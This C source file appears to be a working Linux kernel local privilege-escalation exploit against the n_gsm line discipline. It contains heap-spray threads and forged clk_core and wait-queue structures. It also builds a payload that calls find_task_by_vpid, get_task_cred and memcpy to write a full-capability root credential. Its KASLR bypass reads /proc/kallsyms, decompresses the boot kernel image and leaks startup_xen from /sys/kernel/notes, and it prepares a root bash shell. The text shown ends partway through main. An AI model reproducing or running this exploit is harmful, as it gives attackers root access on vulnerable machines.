#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>
#include <linux/gsmmux.h>
#include <linux/tty.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <pthread.h>
#include <pty.h>
#include <fcntl.h>
#include <poll.h>
#include <string.h>
#include <memory.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <stddef.h>
#include <linux/netfilter/xt_cgroup.h>
#include <asm/bootparam.h>
#include <elf.h>
#include <assert.h>
#include <malloc.h>
#include <sys/capability.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/msg.h>
#include <ctype.h>
#include <sys/inotify.h>
#include <pwd.h>
#include <linux/const.h>

#define offsetofs(st, m) \
    ((size_t)((char *)&((st *)0)->m - (char *)0))

#define UNUSED(x) (void)(x)
#define ALIGN_UP(p, size) (__typeof__(p))(((uintptr_t)(p) + ((size) - 1)) & ~((size) - 1))
#define PAGE_UP(addr)	(((addr)+((PAGE_SIZE)-1))&(~((PAGE_SIZE)-1)))
#define SPIN_WAIT_CONDITION(value, condition) while (condition != value)

#define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))

const unsigned char CMD_CLD =   0x61;
const unsigned char CMD_TEST =  0x11;
const unsigned char DISC =      0x43;
const unsigned char GSM0_SOF =  0xF9;
const unsigned char SABM =      0x2F;
const unsigned char UIH =       0xEF;
const unsigned char CMD_MSC	=   0x71;
const unsigned char EA =        0x01;
const unsigned char CR =        0x02;
const unsigned char PF =        0x10;
const unsigned char INIT_FCS =  0xFF;

const int PAGE_SIZE = 4096;
const int PAGE_SHIFT = 12;
const int STACK_SIZE_SANDBOX = 1000000;
const int STACK_SIZE_EXPLOTATION = 1000000;
const int SOL_IP = 0;
const int KERNEL_PATH_READ_OFFSET = 11;
const int SECTOR_SIZE = 512;
const int BOOT_ENTRY_OFFSET = SECTOR_SIZE;
const int BOOT_SECTOR_COUNT = 1;
const int BOOT_FLAG = 0xAA55;
const int UNCOMPRESSED_KERNEL_SIZE_OFFSET = 4;
const int SETUP_HEADER_OFFSET = BOOT_ENTRY_OFFSET - 15;
const int ASCII_OFFSET = 48;
const int WQ_FLAG_BOOKMARK = 0x04;
const int CLK_OPS_OFFSET = sizeof(uint64_t) * 10;
#define BIT(name)		(1ULL << name)
const int CLK_GET_RATE_NOCACHE = BIT(6);
#define MSG_MSG_SIZE 48
#define HEAP_SPRAY_SIZE 1024
const unsigned int XEN_ELFNOTE_ENTRY = 1;

typedef unsigned long	pteval_t;

const char TEXT_GLOBAL = 'T';
const char TEXT_LOCAL = 't';
const char BSS_LOCAL = 'b';
const char BSS_SMALL_GLOBAL = 'S';
const char BSS_SMALL_LOCAL = 's';
const char BSS_GLOBAL = 'B';
const char DATA_LOCAL = 'd';
const char DATA_GLOBAL = 'D';
const char DATA_SMALL_LOCAL = 'g';
const char DATA_SMALL_GLOBAL = 'G';
const char RODATA_LOCAL = 'r';
const char RODATA_GLOBAL = 'R';
const char WEAK_GLOBAL = 'W';
const char WEAK_LOCAL = 'w';
const char ABSOLUTE_ADDRESS = 'A';

const int MAX_ALLOC_KERNEL_HEAP = 500;
const int MAX_HOLD_THREADS = 50;
const int CR_BIT = CR;


const char* KALLSYMS_PATH = "/proc/kallsyms";
const char* KPTR_RESTRICT_PATH = "/proc/sys/kernel/kptr_restrict";
const char* PERF_EVENT_PARANOID_PATH = "/proc/sys/kernel/perf_event_paranoid";
const char* CMDLINE_PATH = "/proc/cmdline";
const char* KERNEL_NOTES_PATH = "/sys/kernel/notes";
const char* PTY_MAX_PATH = "/proc/sys/kernel/pty/max";

const int ldisc = N_GSM0710;

static unsigned char gsm_fcs8[256] = {
    0x00, 0x91, 0xE3, 0x72, 0x07, 0x96, 0xE4, 0x75,
    0x0E, 0x9F, 0xED, 0x7C, 0x09, 0x98, 0xEA, 0x7B,
    0x1C, 0x8D, 0xFF, 0x6E, 0x1B, 0x8A, 0xF8, 0x69,
    0x12, 0x83, 0xF1, 0x60, 0x15, 0x84, 0xF6, 0x67,
    0x38, 0xA9, 0xDB, 0x4A, 0x3F, 0xAE, 0xDC, 0x4D,
    0x36, 0xA7, 0xD5, 0x44, 0x31, 0xA0, 0xD2, 0x43,
    0x24, 0xB5, 0xC7, 0x56, 0x23, 0xB2, 0xC0, 0x51,
    0x2A, 0xBB, 0xC9, 0x58, 0x2D, 0xBC, 0xCE, 0x5F,
    0x70, 0xE1, 0x93, 0x02, 0x77, 0xE6, 0x94, 0x05,
    0x7E, 0xEF, 0x9D, 0x0C, 0x79, 0xE8, 0x9A, 0x0B,
    0x6C, 0xFD, 0x8F, 0x1E, 0x6B, 0xFA, 0x88, 0x19,
    0x62, 0xF3, 0x81, 0x10, 0x65, 0xF4, 0x86, 0x17,
    0x48, 0xD9, 0xAB, 0x3A, 0x4F, 0xDE, 0xAC, 0x3D,
    0x46, 0xD7, 0xA5, 0x34, 0x41, 0xD0, 0xA2, 0x33,
    0x54, 0xC5, 0xB7, 0x26, 0x53, 0xC2, 0xB0, 0x21,
    0x5A, 0xCB, 0xB9, 0x28, 0x5D, 0xCC, 0xBE, 0x2F,
    0xE0, 0x71, 0x03, 0x92, 0xE7, 0x76, 0x04, 0x95,
    0xEE, 0x7F, 0x0D, 0x9C, 0xE9, 0x78, 0x0A, 0x9B,
    0xFC, 0x6D, 0x1F, 0x8E, 0xFB, 0x6A, 0x18, 0x89,
    0xF2, 0x63, 0x11, 0x80, 0xF5, 0x64, 0x16, 0x87,
    0xD8, 0x49, 0x3B, 0xAA, 0xDF, 0x4E, 0x3C, 0xAD,
    0xD6, 0x47, 0x35, 0xA4, 0xD1, 0x40, 0x32, 0xA3,
    0xC4, 0x55, 0x27, 0xB6, 0xC3, 0x52, 0x20, 0xB1,
    0xCA, 0x5B, 0x29, 0xB8, 0xCD, 0x5C, 0x2E, 0xBF,
    0x90, 0x01, 0x73, 0xE2, 0x97, 0x06, 0x74, 0xE5,
    0x9E, 0x0F, 0x7D, 0xEC, 0x99, 0x08, 0x7A, 0xEB,
    0x8C, 0x1D, 0x6F, 0xFE, 0x8B, 0x1A, 0x68, 0xF9,
    0x82, 0x13, 0x61, 0xF0, 0x85, 0x14, 0x66, 0xF7,
    0xA8, 0x39, 0x4B, 0xDA, 0xAF, 0x3E, 0x4C, 0xDD,
    0xA6, 0x37, 0x45, 0xD4, 0xA1, 0x30, 0x42, 0xD3,
    0xB4, 0x25, 0x57, 0xC6, 0xB3, 0x22, 0x50, 0xC1,
    0xBA, 0x2B, 0x59, 0xC8, 0xBD, 0x2C, 0x5E, 0xCF
};

typedef int (*decompress_func)(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size);

enum sandbox_error {
    SANDBOX_SUCCES,
    SANDBOX_ERROR_SOCKET,
    SANDBOX_ERROR_SETSOCKOPT
};

enum parse_kallsyms_error {
    PARSE_KALLSYMS_SUCCES,
    PARSE_KALLSYMS_FOPEN_ERROR,
    PARSE_KALLSYMS_ALLOC_ERROR,
    PARSE_KALLSYMS_DATA_ERROR,
    PARSE_KALLSYMS_READ_ERROR
};

enum find_kallsyms_offsets_error {
    FIND_KALLSYMS_SUCCES,
    FIND_KALLSYMS_RODATA_ERROR,
    FIND_KALLSYMS_KSYMTAB_ERROR,
    FIND_KALLSYMS_TEXT_ERROR,
    FIND_KALLSYMS_NOT_FOUND,
};

enum fake_write_error {
    EXPLOTATION_SUCCES,
    CREATE_SESSION_ERROR,
    SET_PROCCESS_TTY_ERROR,
    FAKE_INPUT_ERROR,
};

enum proccess_state {
    RUNNING = 'R',
    UNINTERUPT_WAITING = 'D',
};

typedef struct compress_format {
    unsigned char magic[2];
    const char*   name;
    decompress_func decompress;
} compress_format;

struct kernel_symbol {
    int value_offset;
    int name_offset;
    int namespace_offset;
};

typedef struct kallsym {
    char     name_symbol[512];
    char     type;
    uint64_t address;
} kallsym;

typedef struct parse_kallsyms_result {
    enum parse_kallsyms_error error;
    int                       value;
} parse_kallsyms_result;

typedef struct sandbox_result {
    enum sandbox_error error;
    int                error_number;
} sandbox_result;

typedef struct targs_sender_kern_buff {
    int            size;
    uint8_t*       payload;
    sandbox_result result;
} targs_sender_kern_buff;

typedef struct targs_setconf {
    int fd_input;
    pid_t tid;
    int retval;
    int error;
    struct gsm_config* config;
} targs_setconf;

typedef struct targs_fake_input {
    int fd;
    uint8_t* data;
    int count;
    cpu_set_t cpu;
    enum fake_write_error error;
    int ret_errno;
} targs_fake_input;

typedef struct targs_hold {
    volatile int count_threads;
    volatile bool is_hold;
} targs_hold;

typedef struct targs_alloc_kheap {
    int spray_fd;
    int wait_fd;
    uint8_t* data;
    volatile int* count_threads;
} targs_alloc_kheap;

struct list_head {
    uint64_t next, prev;
};

struct hlist_node {
    uint64_t next, pprev;
};

struct wait_entry {
    uint64_t flags;
    uint64_t private;
    uint64_t func;
    struct list_head entry;
};

struct wait_entry_clk_core {
    uint64_t flags;
    uint64_t private_ops;
    uint64_t func;
    struct list_head entry;
    uint64_t of_node_recalc_rate;
    uint64_t parent;
    uint64_t parents;
    uint8_t	num_parents;
    uint8_t	new_parent_index;
    uint64_t rate;
    uint64_t req_rate_set_rate;
    uint64_t new_rate;
    uint64_t new_parent;
    uint64_t new_child;
    uint64_t flags_clk_core;
    bool orphan;
    bool rpm_enabled;
    uint32_t enable_count;
    uint32_t prepare_count;
    uint32_t protect_count;
    uint64_t min_rate;
    uint64_t max_rate;
    uint64_t accuracy;
    int32_t	phase;
    uint64_t duty;
    uint64_t children;
    struct hlist_node	child_node;
    uint64_t	clks;
    uint32_t notifier_count;
};


struct clk_core {
    uint64_t name;
    uint64_t ops;
    uint64_t hw;
    uint64_t owner;
    uint64_t dev;
    uint64_t of_node_recalc_rate;
    uint64_t parent;
    uint64_t parents;
    uint8_t	num_parents;
    uint8_t	new_parent_index;
    uint64_t rate;
    uint64_t req_rate_set_rate;
    uint64_t new_rate;
    uint64_t new_parent;
    uint64_t new_child;
    uint64_t flags;
    bool orphan;
    bool rpm_enabled;
    uint32_t enable_count;
    uint32_t prepare_count;
    uint32_t protect_count;
    uint64_t min_rate;
    uint64_t max_rate;
    uint64_t accuracy;
    int32_t	phase;
    uint64_t duty;
    uint64_t children;
    struct hlist_node	child_node;
    uint64_t	clks;
    uint32_t notifier_count;
};

typedef struct {
    uid_t val;
} kuid_t;


typedef struct {
    gid_t val;
} kgid_t;

typedef struct { uint64_t val; } kernel_cap_t;

#define ULL(x)		(_ULL(x))
#define BIT_ULL(nr)		(ULL(1) << (nr))
#define CAP_VALID_MASK	 (BIT_ULL(CAP_LAST_CAP+1)-1)
kernel_cap_t CAP_FULL_SET = { CAP_VALID_MASK };

struct cred_compact
{
    long     	usage;
    kuid_t		uid;		/* real UID of the task */
    kgid_t		gid;		/* real GID of the task */
    kuid_t		suid;		/* saved UID of the task */
    kgid_t		sgid;		/* saved GID of the task */
    kuid_t		euid;		/* effective UID of the task */
    kgid_t		egid;		/* effective GID of the task */
    kuid_t		fsuid;		/* UID for VFS ops */
    kgid_t		fsgid;		/* GID for VFS ops */
    unsigned	securebits;	/* SUID-less security management */
    kernel_cap_t	cap_inheritable; /* caps our children can inherit */
    kernel_cap_t	cap_permitted;	/* caps we're permitted */
    kernel_cap_t	cap_effective;	/* caps we can actually use */
    kernel_cap_t	cap_bset;	/* capability bounding set */
    kernel_cap_t	cap_ambient;	/* Ambient capability set */
};

struct kernfs_scheme
{
    struct wait_entry_clk_core start;
    struct wait_entry end;
    struct clk_core find_pid;
    struct clk_core set_arg_cred;
    struct clk_core get_cred;
    struct clk_core set_arg_memcpy;
    struct clk_core memcpy_cred;
    struct cred_compact root_cred;
    uint8_t wait_event_data[100];
} kernfs_payload;

int decompress_xz(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size);

int decompress_gzip(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size);

int decompress_bzip2(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size);

int decompress_lzma(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size);

int decompress_lzo(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size);

int decompress_lz4(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size);

int decompress_zstd(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size);


static const struct compress_format compressed_formats[]  = {
    { {0x1f, 0x8b}, "gzip",  decompress_gzip  },
    { {0x1f, 0x9e}, "gzip",  decompress_gzip  },
    { {0x42, 0x5a}, "bzip2", decompress_bzip2 },
    { {0x5d, 0x00}, "lzma",  decompress_lzma  },
    { {0xfd, 0x37}, "xz",    decompress_xz    },
    { {0x89, 0x4c}, "lzo",   decompress_lzo   },
    { {0x02, 0x21}, "lz4",   decompress_lz4   },
    { {0, 0}, NULL, NULL }
};

int get_part_of_static_payload(uint8_t* dst, uint8_t* src, int index);

const compress_format* get_prekernel_payload_type(uint8_t* payload);

bool is_elf_file(uint8_t* payload);

static inline const char* get_name_elf_note(Elf64_Nhdr* note);

static inline Elf64_Nhdr* get_next_elf_note(Elf64_Nhdr* note);

static inline const void* get_descript_elf_note(Elf64_Nhdr* note);

parse_kallsyms_result parse_kallsyms_file(kallsym** array_pointer, int fd_kallsyms);

static inline kallsym* find_symbol_from_kallsyms(kallsym* kallsyms, const int kallsyms_lenght, const char* symbol_name);

enum find_kallsyms_offsets_error find_kallsyms_offsets(const uint8_t* kernel, kallsym* kallsyms, int kallsyms_count);

static inline void resolve_base_kallsyms(kallsym* kallsyms, const int kallsyms_lenght, uint64_t text_address);

const char* sandbox_str_error(enum sandbox_error error_number);

const char* fake_write_str_error(enum fake_write_error error_number);

const char* parse_kallsyms_str_error(enum parse_kallsyms_error error_number);

int thread_sender_kern_buff(void *arg);

void* thread_gsm_setconf(void* data);

int thread_explotation(void* data);

void* thread_hold(void* data);

void* thread_alloc_kheap(void* data);

static void get_raw_msg(uint8_t* buffer, uint8_t addr, uint8_t control);

static void skip_msg(int fd);

static void spin_wait_proccess_state(pid_t pid, pid_t tid, enum proccess_state wait_state);

void wait_del_file(char* directory, char* file_name);

bool post_payloadexec();

pthread_barrier_t barrier_delay;
pthread_barrier_t barrier_setconf;

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    int exit_code_main = EXIT_FAILURE;
    int proccess_ret = 0;
    int proc_cmdline_fd = 0;
    int prekernel_file_fd = 0;
    int boot_setup_sectors_size = 0;
    int kernel_comressed_payload_offset = 0;
    int kernel_uncompressed_size = 0;
    int kernel_payload_size = 0;
    int proc_kallsyms_fd = 0;
    int kallsyms_lenght = 0;
    int kptr_restrict_fd = 0;
    int kptr_restrict = 0;
    int perf_event_paranoid_fd = 0;
    int perf_event_paranoid = 0;
    int kernel_notes_fd = 0;
    int fd_input = 0;
    int fd_output = 0;
    int heap_spray_pipe[2];
    int lockdep_map_size  = 32;             //key + class_cache[2] + name
    int spinlock_t_size = 4;                //atomic_val
    int mutex_size = 24;                    //owner + waitlist
    int gsm_mux_event_offset = 0;
    int pty_max_fd = 0;
    int thread_spray_permisiible = 0;
    volatile int thread_spray_count = 0;
    const int clone_flags_sandbox = CLONE_NEWUSER | CLONE_NEWNET | CLONE_VM;
    const int clone_flags_explotation = CLONE_FILES | CLONE_VM;

    char tmp_array[MAX_ALLOC_KERNEL_HEAP];
    char kernel_raw_path[4096];
    char str_long[21];

    char* kernel_path = NULL;
    char* newargv[]    = {"bash", "-c", "cd /root ; bash", NULL};
    char* newenviron[] = { NULL };

    long retval = 0;
    long pty_max = 0;

    uint64_t leak_startup_xen = 0;
    uint64_t leak_kernel_text = 0;
    uint64_t offset_entry = 0;
    uint64_t offset_hw = 0;
    uint64_t offset_rate = 0;
    uint64_t offset_recalc_rate = 0;
    uint64_t offset_ops = 0;
    uint64_t clk_entry = 0;
    uint64_t find_pid_addr = 0;
    uint64_t get_cred_addr = 0;
    uint64_t set_arg_cred_addr = 0;
    uint64_t set_arg_memcpy_addr = 0;
    uint64_t memcpy_cred_addr = 0;
    uint64_t root_cred_addr = 0;
    uint64_t entry_end = 0;
    uint64_t gsm_addr = 0;

    uint64_t* gsm_mux_heap = 0;

    cap_t self_capability;
    cap_flag_value_t self_capsyslog;

    kallsym* kallsyms = NULL;
    kallsym* kallsym_startup_xen = NULL;
    kallsym* kallsym_rwlock_init = NULL;            //CONFIG_DEBUG_SPINLOCK
    kallsym* kallsym_lockdep_sys_exit_thunk = NULL; //CONFIG_DEBUG_LOCK_ALLOC
    kallsym* kallsym_lock_contended = NULL;         //CONFIG_LOCK_STAT
    kallsym* kallsym_mutex_spin_on_owner = NULL;    //CONFIG_MUTEX_SPIN_ON_OWNER
    kallsym* kallsym_mutex_destroy = NULL;          //CONFIG_DEBUG_MUTEXES
    kallsym* kallsym_kernfs_pr_cont_buf = NULL;
    kallsym* kallsym_clk_change_rate = NULL;
    kallsym* kallsym_clk_nodrv_prepare_enable = NULL;
    kallsym* kallsym_find_task_by_vpid = NULL;
    kallsym* kallsym_memcpy = NULL;
    kallsym* kallsym_get_task_cred = NULL;

    uint8_t heap_data[HEAP_SPRAY_SIZE];
    uint8_t control_msg[6];
    uint8_t* kernel_compressed_payload = NULL;
    uint8_t* kernel_payload = NULL;
    uint8_t* prekernel_mmaped_file = NULL;
    uint8_t* kernel_file_notes = NULL;
    uint8_t* sandbox_stack = NULL;
    uint8_t* explotation_stack = NULL;

    Elf64_Nhdr* xen_startup_note = NULL;
    Elf64_Nhdr* end_note = NULL;

    struct setup_header* kernel_setup_header = NULL;

    struct stat prekernel_file_stat;
    struct stat kernel_file_notes_stat;

    cpu_set_t core_alloc_dlci;

    pid_t pid_sandbox;
    pid_t pid_explotation;
    pthread_t tid_setconf;
    pthread_t tid_hold[MAX_HOLD_THREADS];
    pthread_t tids_spray_dlci[MAX_ALLOC_KERNEL_HEAP];

    pthread_attr_t tattr_alloc_dlci;

    struct list_head* wait_event_list;

    targs_sender_kern_buff args_sandbox_kern_buff;
    targs_setconf args_setconf;
    targs_fake_input args_explotation;
    targs_hold args_hold = {0, true};
    targs_alloc_kheap* args_heap_spray;

    parse_kallsyms_result parse_kallsyms = {0, 0};
    enum find_kallsyms_offsets_error find_kallsyms_result = 0;

    struct gsm_config setconf_config;
    setconf_config.encapsulation = 0;
    setconf_config.adaption = 1;
    setconf_config.mru = 64;
    setconf_config.mtu = 64;
    setconf_config.t1 = 1;
    setconf_config.t2 = 10;
    setconf_config.t3 = 1;
    setconf_config.i = 1;
    setconf_config.n2 = 0;
    setconf_config.k = 0;
    setconf_config.initiator = 0;

    args_setconf.config = &setconf_config;

    CPU_ZERO(&core_alloc_dlci);
    CPU_SET(0, &core_alloc_dlci);


    pty_max_fd = open(PTY_MAX_PATH, O_RDONLY);
    if (pty_max_fd < 0)
    {
        fprintf(stderr, "Error open %s, %s \n", PTY_MAX_PATH, strerror(errno));
        goto error_pty_max;
    }

    retval = read(pty_max_fd, str_long, sizeof(str_long));
    if (retval < 1)
    {
        fprintf(stderr, "Error read %s, %s \n", PTY_MAX_PATH, strerror(errno));
        goto error_read_pty_max;
    }

    pty_max = strtol(str_long, NULL, 0);
    if (pty_max < 2)
    {
        fprintf(stderr, "Error pty max small value -> %ld \n", pty_max);
        goto error_pty_max_value;
    }

    thread_spray_permisiible = MIN(pty_max, MAX_ALLOC_KERNEL_HEAP);

    proc_kallsyms_fd = open(KALLSYMS_PATH, O_RDONLY);
    if (proc_kallsyms_fd < 0)
    {
        fprintf(stderr, "Error open %s, %s \n", KALLSYMS_PATH, strerror(errno));
        goto error_kallsyms_not_exist;
    }

    parse_kallsyms = parse_kallsyms_file(&kallsyms, proc_kallsyms_fd);
    if (parse_kallsyms.error != PARSE_KALLSYMS_SUCCES)
    {
        const char* kallsyms_error =  parse_kallsyms_str_error(parse_kallsyms.error);
        const char* errno_error = strerror(parse_kallsyms.value);
        fprintf(stderr, "Error parse %s, %s, %s \n", KALLSYMS_PATH, kallsyms_error, errno_error);
        goto error_parse_kallsyms;
    }

    kallsyms_lenght = parse_kallsyms.value;

    kptr_restrict_fd = open(KPTR_RESTRICT_PATH, O_RDONLY);
    if (kptr_restrict_fd < 0)
    {
        fprintf(stderr, "Error open %s, %s \n", KPTR_RESTRICT_PATH, strerror(errno));
        goto error_open_kptr;
    }

    retval = read(kptr_restrict_fd, &kptr_restrict, 1);
    if (retval < 1)
    {
        fprintf(stderr, "Error read %s, %s \n", KPTR_RESTRICT_PATH, strerror(errno));
        goto error_read_kptr;
    }

    perf_event_paranoid_fd = open(PERF_EVENT_PARANOID_PATH, O_RDONLY);
    if (perf_event_paranoid_fd < 0)
    {
        fprintf(stderr, "Error open %s, %s \n", PERF_EVENT_PARANOID_PATH,  strerror(errno));
        goto error_open_event_paranoid;
    }

    retval = read(perf_event_paranoid_fd, &perf_event_paranoid, 1);
    if (retval < 1)
    {
        fprintf(stderr, "Error read %s, %s \n", PERF_EVENT_PARANOID_PATH, strerror(errno));
        goto error_read_event_paranoid;
    }

    kptr_restrict -= ASCII_OFFSET;
    perf_event_paranoid -= ASCII_OFFSET;

    self_capability = cap_get_proc();
    if (self_capability == NULL)
    {
        fprintf(stderr, "Error get self caps %s \n", strerror(errno));
        goto error_cap_proc;
    }

    retval = cap_get_flag(self_capability, CAP_SYSLOG, CAP_EFFECTIVE, &self_capsyslog);
    if (retval != 0)
    {
        fprintf(stderr, "Error get CAP_SYSLOG from self caps  %s \n", strerror(errno));
        goto error_get_flag;
    }

    if (kptr_restrict == 0 && perf_event_paranoid <= 1)
        goto skip_retrieval_kallsyms;
    else if (kptr_restrict == 1 && self_capsyslog == CAP_SET)
        goto skip_retrieval_kallsyms;

    printf("kallsyms restricted, begin retvial kallsyms table \n");

    proc_cmdline_fd = open(CMDLINE_PATH, O_RDONLY);
    if (proc_cmdline_fd < 0)
    {
        fprintf(stderr, "Error open file proc/cmdline, %s \n", strerror(errno));
        goto error_open_cmdline;
    }

    retval = pread(proc_cmdline_fd, kernel_raw_path, PATH_MAX, KERNEL_PATH_READ_OFFSET);
    if (retval < 0)
    {
        fprintf(stderr, "Error read path from file %s %s \n", CMDLINE_PATH, strerror(errno));
        goto error_read_kernel_path;
    }

    kernel_path = strtok(kernel_raw_path, " ");
    if (kernel_path == NULL)
    {
        fprintf(stderr, "Error tokenize path from raw data of file %s, %s \n", CMDLINE_PATH, strerror(errno));
        goto error_get_kernel_path;
    }

    printf("detected kernel path-> %s \n", kernel_path);

    prekernel_file_fd = open(kernel_path, O_RDONLY);
    if (prekernel_file_fd < 0)
    {
        fprintf(stderr, "Error open kernel file, %s \n", strerror(errno));
        goto error_open_kernel;
    }

    retval = fstat(prekernel_file_fd, &prekernel_file_stat);
    if (retval < 0)
    {
        fprintf(stderr, "Error get stat kernel file %s \n", strerror(errno));
        goto error_get_kernel_file_stat;
    }

    prekernel_mmaped_file = (uint8_t*) mmap(NULL, prekernel_file_stat.st_size, PROT_READ, MAP_PRIVATE, prekernel_file_fd, 0);
    if (prekernel_mmaped_file == MAP_FAILED)
    {
        fprintf(stderr, "Mmap kernel file failed, %s \n", strerror(errno));
        goto error_mmap_kernel_file;
    }

    kernel_setup_header = (struct setup_header*) (prekernel_mmaped_file + SETUP_HEADER_OFFSET);
    if (kernel_setup_header->boot_flag != BOOT_FLAG)
    {
        fprintf(stderr, "Failed cheking bootflag, file is not prekernel \n");
        goto error_check_boot_flag;
    }

    boot_setup_sectors_size = (kernel_setup_header->setup_sects + BOOT_SECTOR_COUNT) * SECTOR_SIZE;
    kernel_comressed_payload_offset = boot_setup_sectors_size + kernel_setup_header->payload_offset;
    kernel_compressed_payload = prekernel_mmaped_file + kernel_comressed_payload_offset;

    const compress_format* detected_compress_format = get_prekernel_payload_type(kernel_compressed_payload);
    if (detected_compress_format->name)
    {
        printf("detected compressed format -> %s \n", detected_compress_format->name);
        kernel_payload_size = kernel_setup_header->payload_length - UNCOMPRESSED_KERNEL_SIZE_OFFSET;
        kernel_uncompressed_size = *(uint32_t*)(kernel_compressed_payload + kernel_payload_size);
    }
    else if (is_elf_file(kernel_compressed_payload))
    {
        printf("detected uncompressed elf kernel \n");
        kernel_payload_size = kernel_setup_header->payload_length;
        kernel_uncompressed_size = kernel_payload_size;
    }
    else
    {
        fprintf(stderr, "Failed detect payload format \n");
        goto error_unknow_paload_format;
    }

    printf("Uncompressed kernel size -> %u \n", kernel_uncompressed_size);
    kernel_payload = (uint8_t*) malloc(kernel_uncompressed_size);
    if (kernel_payload == NULL)
    {
        fprintf(stderr, "Error allocate memory for uncompressed kernel, %s \n", strerror(errno));
        goto error_alloc_kernel_payload;
    }

    if (is_elf_file(kernel_compressed_payload))
    {
        memcpy(kernel_payload, kernel_compressed_payload, kernel_uncompressed_size);
    }
    else
    {
        retval = detected_compress_format->decompress(kernel_compressed_payload, kernel_payload_size, kernel_payload, kernel_uncompressed_size);
        if (retval < 0)
        {
            fprintf(stderr, "Error decompress payload \n");
            goto error_decompress;
        }
        else if (!is_elf_file(kernel_payload))
        {
            fprintf(stderr, "Error decompressed payload is not ELF file \n");
            goto error_payload_not_elf;
        }
    }

    printf("successfully taken kernel! \n");
    printf("begin try leak startup_xen! \n");

    kernel_notes_fd = open(KERNEL_NOTES_PATH, O_RDONLY);
    if (kernel_notes_fd < 0)
    {
        fprintf(stderr, "Error open kernel notes file %s, %s \n", KERNEL_NOTES_PATH, strerror(errno));
        goto error_open_kernel_notes;
    }

    retval = fstat(kernel_notes_fd, &kernel_file_notes_stat);
    if (retval < 0)
    {
        fprintf(stderr, "Error get stat kernel notes file %s, %s \n", KERNEL_NOTES_PATH, strerror(errno));
        goto error_get_kernel_notes_file_stat;
    }

    kernel_file_notes = (uint8_t*) malloc(kernel_file_notes_stat.st_size);
    if (kernel_file_notes == NULL)
    {
        fprintf(stderr, "Error allocate memory for kernel notes runtime, %s \n", strerror(errno));
        goto error_alloc_kernel_notes;
    }

    retval = read(kernel_notes_fd, kernel_file_notes, kernel_file_notes_stat.st_size);
    if (retval < 1)
    {
        fprintf(stderr, "Error read %s, %s \n", KERNEL_NOTES_PATH, strerror(errno));
        goto error_read_kernel_notes;
    }

    xen_startup_note = (Elf64_Nhdr*) kernel_file_notes;
    end_note = (Elf64_Nhdr*) (kernel_file_notes + kernel_file_notes_stat.st_size);
    while (xen_startup_note <= end_note)
    {
        const char* note_name = get_name_elf_note(xen_startup_note);
        Elf64_Word type = xen_startup_note->n_type;
        if (!strcmp(note_name, "Xen") && type == XEN_ELFNOTE_ENTRY)
            break;

        xen_startup_note = get_next_elf_note(xen_startup_note);
    }

    if (xen_startup_note > end_note)
    {
        fprintf(stderr, "Error not found xen entry note \n");
        goto error_find_xen_note;
    }

    leak_startup_xen = *(uint64_t*) get_descript_elf_note(xen_startup_note);

    find_kallsyms_result = find_kallsyms_offsets(kernel_payload, kallsyms, kallsyms_lenght);
    if (find_kallsyms_result != FIND_KALLSYMS_SUCCES)
    {
        fprintf(stderr, "Error set kallsyms offsets \n");
        goto error_find_kallsyms_offsets;
    }

    kallsym_startup_xen = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "startup_xen");
    if (kallsym_startup_xen == NULL)
    {
        fprintf(stderr, "Error not found startup_xen in parsed kallsyms \n");
        goto error_find_startup_xen;
    }

    leak_kernel_text = leak_startup_xen - kallsym_startup_xen->address;
    printf("startup_xen leaked address  -> %lx \n", leak_startup_xen);
    printf("text leaked address         -> %lx \n", leak_kernel_text);

    resolve_base_kallsyms(kallsyms, kallsyms_lenght, leak_kernel_text);

    skip_retrieval_kallsyms:

    kallsym_rwlock_init                 = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "__rwlock_init");
    kallsym_lockdep_sys_exit_thunk      = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "lockdep_sys_exit_thunk");
    kallsym_lock_contended              = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "lock_contended");
    kallsym_mutex_spin_on_owner         = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "mutex_spin_on_owner");
    kallsym_mutex_destroy               = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "mutex_destroy");

    kallsym_kernfs_pr_cont_buf = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "kernfs_pr_cont_buf");
    if (kallsym_kernfs_pr_cont_buf == NULL)
    {
        fprintf(stderr, "Error not found kallsym_kernfs_pr_cont_buf in parsed kallsyms \n");
        goto error_find_kernfs_pr_cont_buf;
    }

    kallsym_clk_change_rate = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "clk_change_rate");
    if (kallsym_clk_change_rate == NULL)
    {
        fprintf(stderr, "Error not found clk_change_rate in parsed kallsyms \n");
        goto error_clk_change_rate;
    }

    kallsym_clk_nodrv_prepare_enable = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "clk_nodrv_prepare_enable");
    if (kallsym_clk_nodrv_prepare_enable == NULL)
    {
        fprintf(stderr, "Error not found clk_nodrv_prepare_enable in parsed kallsyms \n");
        goto error_clk_nodrv_prepare_enable;
    }

    kallsym_find_task_by_vpid = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "find_task_by_vpid");
    if (kallsym_find_task_by_vpid == NULL)
    {
        fprintf(stderr, "Error not found find_task_by_vpid in parsed kallsyms \n");
        goto error_find_task_by_vpid;
    }

